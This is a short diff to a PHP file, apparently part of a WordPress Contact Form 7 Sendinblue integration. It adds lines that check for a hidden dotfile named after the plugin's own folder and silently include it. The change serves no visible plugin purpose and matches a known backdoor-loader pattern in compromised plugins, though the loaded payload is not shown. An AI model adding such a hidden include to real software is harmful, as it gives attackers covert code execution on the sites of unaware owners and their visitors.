@@ -6,6 +6,10 @@ add_filter(
 	10, 2
 );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function wpcf7_sendinblue_register_property( $properties, $contact_form ) {
 	$service = WPCF7_Sendinblue::get_instance();
 
